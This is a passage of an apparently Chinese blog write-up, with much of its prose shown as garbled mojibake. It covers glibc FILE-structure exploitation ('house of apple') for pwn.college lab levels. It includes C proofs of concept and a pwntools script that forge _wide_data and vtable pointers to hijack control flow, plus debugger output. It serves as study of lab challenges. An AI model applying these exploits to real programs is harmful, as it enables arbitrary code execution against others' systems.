=<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line">    <span class="comment">//4.ä¿®æ”¹FILE.vtableæŒ‡å‘3ä¸­æ³„éœ²çš„_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.ä¿®æ”¹FILE._wide_dataæŒ‡å‘2ä¸­æ„é€ çš„fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.é€šè¿‡æ²¾stdoutäº²å¸¦æ•…ä¸Šé“¾</span></span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_chain = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h2 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a><a target="_blank" rel="noopener" href="https://pwn.college/software-exploitation/file-struct-exploits/">pwn.college</a></h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>ç¯¡æ”¹ä½äºå †ä¸Šçš„<code>FILE</code>ç»“æ„,ä½¿å…¶æ–‡ä»¶æè¿°ç¬¦<code>fileno</code>ä¸º1,ä¹Ÿå°±æ˜¯åˆ°æ ‡å‡†è¾“å‡º</p>
<p>ä½¿å…¶ç¼“å†²åŒºä½äºæ³„éœ²åœ°å€ä¸Š</p>
<p>ä¸¾ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> flag[]=<span class="string">&quot;flag&#123;secret&#125;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,flag);			<span class="comment">//æ³„éœ²flagåœ°å€</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,fp,<span class="number">480</span>);</span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">0x100</span>,fp);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



















<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><code>level7</code>é¢˜ç›®ä¸­ç»™çš„æç¤ºæ˜¯è¿™æ ·çš„:</p>
<blockquote>
<p> This can be done by creating a fake _wide_data struct which will not have a security check on the vtable. </p>
</blockquote>
<p>æ„æ€æ˜¯ç¯¡æ”¹<code>_wide_data.vtable</code>æŒ‡é’ˆä¸ä¼šè¢«æ£€æŸ¥</p>
<p>åœ¨ä¸€ä¸ª<code>FILE</code>ç»“æ„ä½“ä¸­,ç†è®ºä¸Šæœ‰ä¸¤ä¸ª<code>vtable</code>æŒ‡é’ˆ,ä¸€ä¸ª<code>_IO_FILE_plus + 0xd8</code>å¤„çš„<code>vtable</code>æŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x00d8 */</span>    FILE file;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  224 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ä¸ªåœ¨<code>_IO_FILE._wide_data._wide_vtable</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE + 0xa0    =&gt;  _wide_data</span><br><span class="line">_wide_data + 0xe0  =&gt;  _wide_vtable</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line"><span class="comment">/* 0x0068      |  0x0070 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0038 */</span>        _IO_iconv_t __cd_in;</span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0038 */</span>        _IO_iconv_t __cd_out;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):  112 */</span></span><br><span class="line">                               &#125; _codecvt;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0004 */</span>    <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x00e0      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  232 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>



<p>æ—¢ç„¶<code>_IO_FILE</code>æœ¬èº«å°±è‡ªå¸¦ä¸€ä¸ª<code>vtable</code>,é‚£ä¹ˆ<code>level7</code>ä¸ºä½•è¿˜è¦å¤šæ­¤ä¸€ä¸¾å»æ”¹<code>_IO_FILE._wide_data._wide_vtable</code>?</p>
<p>å› ä¸º<code>pwncollege</code>æä¾›çš„é¶åœºç¯å¢ƒä¸­ä½¿ç”¨çš„<code>libc</code>ç‰ˆæœ¬æ˜¯<code>Ubuntu GLIBC 2.31-0ubuntu9.16</code></p>
<p>åœ¨<code>Glibc 2.23</code>ä¹‹å‰æ˜¯å¯ä»¥ç›´æ¥ä¿®æ”¹<code>_IO_FILE.vtable</code>æŒ‡é’ˆçš„, ç›¸å…³æ”»å‡»æ–¹å¼è¢«ç§°ä¸º<code>house of orange</code>,</p>
<p>æ­¤æ”»å‡»å¯ä»¥åœ¨<code>how2heap</code>é¶åœºå­¦ä¹ ,<code>ubuntu16.04</code>æœ‰<code>Glibc2.23</code>ç¯å¢ƒ</p>
<p>ä½†<code>Glibc 2.24</code>ä¹‹åå°±åŠ å…¥äº†å¯¹<code>_IO_FILE.vtable</code>æŒ‡é’ˆçš„èŒƒå›´æ£€æŸ¥,åªèƒ½åœ¨<code>glibc</code>å†…å­˜åŒºä¸­çš„æŸä¸ªç‰¹å®šä½ç½®,ä¸å…è®¸æŒ‡å‘å †åŒºæˆ–è€…æ ˆåŒº</p>
<p>ä½†æ˜¯<code>_IO_FILE._wide_data._wide_vtable</code>è¿˜æ˜¯æ²¡æœ‰æ£€æŸ¥çš„,ç›¸å…³æ”»å‡»æ–¹å¼è¢«ç§°ä¸º<code>house of apple</code></p>
<p>åƒå®Œ<code>apple</code>å›æ¥,å¯ä»¥åšlevel7é¢˜äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *          </span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./babyfile_level7&quot;</span>)</span><br><span class="line"><span class="comment"># p=process(&quot;/challenge/babyfile_level7&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line"><span class="comment">#è·å–winå‡½æ•°åœ°å€,æ³„éœ²putsåœ°å€,æ³„éœ²libcåŸºåœ°å€,æ³„éœ²_IO_wfile_jumpsåœ°å€</span></span><br><span class="line">win_addr = <span class="number">0x4012E6</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The address of puts() within libc is: &#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(puts_addr,<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[LEAK] The name buffer is located at: &#x27;</span>)</span><br><span class="line">name_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">name_addr = <span class="built_in">int</span>(name_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr = &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name_addr = &quot;</span>,<span class="built_in">hex</span>(name_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">vtable_addr = libc_addr + libc.dump(<span class="string">&quot;_IO_file_jumps&quot;</span>)</span><br><span class="line">wide_vtable_addr =libc_addr + libc.dump(<span class="string">&quot;_IO_wfile_jumps&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc @ %p&quot;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vtable = &quot;</span>,<span class="built_in">hex</span>(vtable_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;wide_vtable = &quot;</span>,<span class="built_in">hex</span>(wide_vtable_addr))    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1&amp;2 </span></span><br><span class="line"><span class="comment">#æ„é€ fake_wide_dataå’Œfake_wide_vtable,</span></span><br><span class="line"><span class="comment">#ç”±äºåªæœ‰ä¸€ä¸ªå¯ç”¨å †å—,å“¥ä¿©å¾—ç©¿ä¸€æ¡è£¤å­</span></span><br><span class="line">fake_wide_data_addr = name_addr</span><br><span class="line">fake_wide_vtable_addr = name_addr + <span class="number">0x80</span></span><br><span class="line">fake_wide_data  =p64(<span class="number">0</span>) * <span class="number">28</span></span><br><span class="line">fake_wide_data += p64(fake_wide_vtable_addr)<span class="comment">#     const struct _IO_jump_t *_wide_vtable;</span></span><br><span class="line">fake_wide_data += p64(win_addr)</span><br><span class="line">p.send(fake_wide_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="comment">#è®¾ç½®FILE.flag</span></span><br><span class="line">fp = FileStructure()</span><br><span class="line">fp.flags = ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>)</span><br><span class="line"><span class="comment">#ä¸èƒ½æœ‰_IO_CURRENTLY_PUTTING</span></span><br><span class="line"><span class="comment">#å¯å†™,ä¸èƒ½æœ‰_IO_NO_WRITES</span></span><br><span class="line"><span class="comment">#ä¸èƒ½æœ‰_IO_UNBUFFERED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4&amp;5</span></span><br><span class="line"><span class="comment">#ä¿®æ”¹FILE.vtableæŒ‡å‘_IO_wfile_jumps,</span></span><br><span class="line"><span class="comment">#ä¿®æ”¹FILE._wide_dataæŒ‡å‘fake_wide_data</span></span><br><span class="line"><span class="comment">#è¿™é‡Œè®¾ç½®çš„flagsæ˜¯ä¿è¯èƒ½è¿›å…¥æŸäº›åˆ†æ”¯</span></span><br><span class="line">fp.vtable = wide_vtable_addr</span><br><span class="line">fp._wide_data = name_addr</span><br><span class="line">payload = <span class="built_in">bytes</span>(fp)</span><br><span class="line"><span class="built_in">print</span>(fp)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><code>level9</code>ä¸­æœ‰ä¸€ä¸ªå‡½æ•°<code>authenticated</code>å¯ä»¥<code>ret2text</code></p>
<p><code>level9</code>é¦–å…ˆæ³„éœ²çš„<code>puts</code>çš„åœ°å€</p>
<p><code>level9</code>ç»™çš„åˆ©ç”¨ç‚¹å°±æ˜¯å¯ä»¥å¾€<code>_IO_2_1_stdout_</code>ç»“æ„ä½“å†™å…¥æœ€å¤š<code>0x1e0</code>ä¸ªå­—èŠ‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0,stdout,0x1e0)</span><br></pre></td></tr></table></figure>

<p>æœ€åˆçš„æƒ³æ³•æ˜¯ç›´æ¥ä¿®æ”¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stdout -&gt; vtable = _IO_wfile_jumps</span><br><span class="line">stdout -&gt; _wide_data -&gt; _wide_vtable -&gt; _IO_wfile_doallocate = authenticated </span><br></pre></td></tr></table></figure>

<p>è¿™æ ·åœ¨ä¸‹æ¬¡<code>puts</code>æˆ–è€…<code>printf</code>æ—¶å°±å¯ä»¥è§¦å‘<code>authenticated</code>å‡½æ•°</p>
<p>ç„¶è€Œå¾ˆä¸å¹¸</p>
<p><code>authenticated</code>ä¸­åœ¨ä½¿ç”¨<code>write(1,flag_buffer,flag_length)</code>æ‰“å°flagä¹‹å‰,è¿˜æœ‰ä¸€ä¸ª<code>puts(&quot;You win! Here is your flag:&quot;);</code>è¿™ä¼šå¯¼è‡´ä»€ä¹ˆå‘¢?</p>
<p>putsè°ƒç”¨authenticated</p>
<p>authenticatedè°ƒç”¨puts</p>
<p>putsè°ƒç”¨authenticated</p>
<p>authenticatedè°ƒç”¨puts</p>
<p>â€¦</p>
<p>å‘ç”Ÿäº†é€’å½’è°ƒç”¨çš„æ‚²å‰§, æœ€ç»ˆç¨‹åºä¼šå› ä¸ºçˆ†æ ˆå†…å­˜å¯¼è‡´æ®µé”™è¯¯</p>
<p>åŸå› æ˜¯<code>puts</code>é»˜è®¤ä½¿ç”¨çš„å°±æ˜¯<code>stdout</code>,è€Œæˆ‘ä»¬æ”¹çš„ä¹Ÿæ­£æ˜¯<code>stdout</code></p>
<blockquote>
<p>å¯ä»¥é€šè¿‡è¿™ä¸ªpocè°ƒè¯•è§‚å¯Ÿè¿™ä¸ªæ‚²å‰§</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.æ³„éœ²libcåŸºåœ°å€,è®¡ç®—å¾—åˆ°_IO_wfile_jumpsè¡¨çš„åœ°å€</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.æ„é€ fake_wide_vtable,ä½¿ç”¨winå¡«å……</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.æ„é€ fake_wide_data,ä½¿å¾—å…¶åç§»0xe0å¤„çš„_wide_vtableæŒ‡é’ˆ,æŒ‡å‘1ä¸­æ„é€ çš„fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.ä¿®æ”¹FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end =<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.ä¿®æ”¹FILE.vtableæŒ‡å‘3ä¸­æ³„éœ²çš„_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.ä¿®æ”¹FILE._wide_dataæŒ‡å‘2ä¸­æ„é€ çš„fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.stdoutæŒ‡å‘fp</span></span><br><span class="line">    <span class="built_in">stdout</span> = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//7.trigger</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨winä¸Šä¸‹æ–­ç‚¹å‘ç°winç¡®å®å¯ä»¥è°ƒç”¨,ä½†æ˜¯winä¸­çš„putsä¼šé€’å½’è°ƒç”¨åˆ°win</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line"><span class="comment">#0  win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#1  0x00007ffff7e4a5a6 in __GI__IO_wdoallocbuf (fp=fp@entry=0x4058d0) at ./libio/wgenops.c:369</span></span><br><span class="line"><span class="comment">#2  0x00007ffff7e4c2ad in __GI__IO_wfile_overflow (f=0x4058d0, wch=1668183398) at ./libio/wfileops.c:421</span></span><br><span class="line"><span class="comment">#3  0x00007ffff7e4a472 in __GI___woverflow (wch=1668183398, f=0x4058d0) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#4  __GI__IO_wdefault_xsputn (n=&lt;optimized out&gt;, data=&lt;optimized out&gt;, f=&lt;optimized out&gt;) at ./libio/wgenops.c:315</span></span><br><span class="line"><span class="comment">#5  __GI__IO_wdefault_xsputn (f=f@entry=0x4058d0, data=&lt;optimized out&gt;, n=n@entry=19) at ./libio/wgenops.c:282</span></span><br><span class="line"><span class="comment">#6  0x00007ffff7e4cecb in __GI__IO_wfile_xsputn (n=19, data=&lt;optimized out&gt;, f=0x4058d0) at ./libio/wfileops.c:1010</span></span><br><span class="line"><span class="comment">#7  __GI__IO_wfile_xsputn (f=0x4058d0, data=&lt;optimized out&gt;, n=19) at ./libio/wfileops.c:956</span></span><br><span class="line"><span class="comment">#8  0x00007ffff7e476b5 in __GI__IO_puts (str=0x402004 &quot;function win called&quot;) at ./libio/libioP.h:1030</span></span><br><span class="line"><span class="comment">#9  0x0000000000401179 in win () at stdout.c:4</span></span><br><span class="line"><span class="comment">#10 